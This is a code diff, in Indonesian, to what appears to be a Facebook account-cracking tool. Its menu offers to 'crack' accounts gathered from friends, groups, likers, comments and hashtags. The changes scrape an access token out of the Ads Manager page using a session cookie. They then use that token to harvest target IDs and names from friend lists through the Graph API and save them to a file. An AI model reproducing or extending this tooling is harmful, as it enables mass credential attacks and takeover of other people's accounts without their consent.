@@ -87,6 +87,7 @@ try:
 except requests.exceptions.ConnectionError:
 	print("* Perisak Jaringan Anda..!!");quit()
 
+mytok = []
 #"""WARNA RICH"""
 H = "#000000" # Hitam
 M = "#FF0000" # Merah
@@ -595,6 +596,8 @@ class menu:
 			MMK = HH
 			OZ = HH
 			OQ = HH
+		try:ads = requests.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':codeteam["cookie"]});url = requests.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':codeteam["cookie"]});mytok.append(re.search('accessToken="(.*?)"',str(url.content)).group(1))
+		except:exit('Failled Convert Cookie')
 		tampilan_menu = f"""   {QQ}[{CC}01{QQ}] {PP}Crack From Teman Sendiri   {QQ}[{CC}04{QQ}] {PP}Crack From Public   {QQ}[{CC}07{QQ}] {PP}Crack From Follow
    {QQ}[{CC}02{QQ}] {PP}Crack From Search Name     {QQ}[{CC}05{QQ}] {PP}Crack From Email    {QQ}[{CC}08{QQ}] {PP}Crack From Group
    {QQ}[{CC}03{QQ}] {PP}Crack From Komen           {QQ}[{CC}06{QQ}] {PP}Crack From Liker    {QQ}[{CC}09{QQ}] {PP}Crack From Hastag"""
@@ -659,11 +662,13 @@ class menu:
 		except IOError:
 #			os.remove(".data/sensi.json");os.sys.exit("Cookies Anda Error !")
 			self.menu_login()
+		# try:ads = requests.get('https://www.facebook.com/adsmanager/manage/campaigns', cookies={'cookie':codeteam["cookie"]});url = requests.get('https://www.facebook.com/adsmanager/manage/campaigns?act='+ re.search('act=(.*?)&nav_source',str(ads.content)).group(1) +'&nav_source=no_referrer', cookies={'cookie':codeteam["cookie"]});self.ab = re.search('accessToken="(.*?)"',str(url.content)).group(1)
+		# except:exit('CookieError')
 		try:
-			zz = requests.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token=='+codeteam["token"],cookies={'cookie': codeteam["cookie"]}).json()
-			for xx in zz['friends']['data']:
-				try:id.append(xx['id']+'<=>'+xx['name'])
-				except:continue
+			zz = requests.get(f'https://graph.facebook.com/me/friends?fields=id,name&limit=5000&access_token='+ mytok[0],cookies={'cookie': codeteam["cookie"]}).json()
+			for xx in zz['data']:
+			    try:id.append(xx['id']+'<=>'+xx['name'])
+			    except:continue
 		except requests.exceptions.ConnectionError:prints(Panel(f"{WAR}Jaringan Anda Error, Silahkan Check Atau Coba Lagi",width=100,padding=(0),style=f"{A}"));quit()
 		except (KeyError,IOError):prints(Panel(f"{WAR}Sepetinya Teman Anda Tidak Ada.. Awok-Awok-Awok",width=100,padding=(0),style=f"{A}"));quit()
 		try:
@@ -697,8 +702,8 @@ class menu:
 		idzz = input(f"{a}   ┗{k}Target ID : {a}").split("|")
 		for idz in idzz:
 			try:
-				zz = requests.get('https://graph.facebook.com/v15.0/'+idz+'?fields=friends.limit(5000)&access_token='+codeteam["token"],cookies={'cookie': codeteam["cookie"]}).json()
-				for xx in zz['friends']['data']:
+				zz = requests.get('https://graph.facebook.com/'+idz+'/friends?fields=id,name&limit=5000&access_token='+ mytok[0],cookies={'cookie': codeteam["cookie"]}).json()
+				for xx in zz['data']:
 					open("x","a").write(xx["id"]+"|"+xx["name"]+"\n")
 					try:id.append(xx['id']+'<=>'+xx['name'])
 					except:continue
@@ -1228,5 +1233,4 @@ if "hai" == "hai":
 	except:os.sys.exit("* Makanya Jangan Rikod Sc Orang")
 	folder()
 	menu().daftar_menu()
-
 
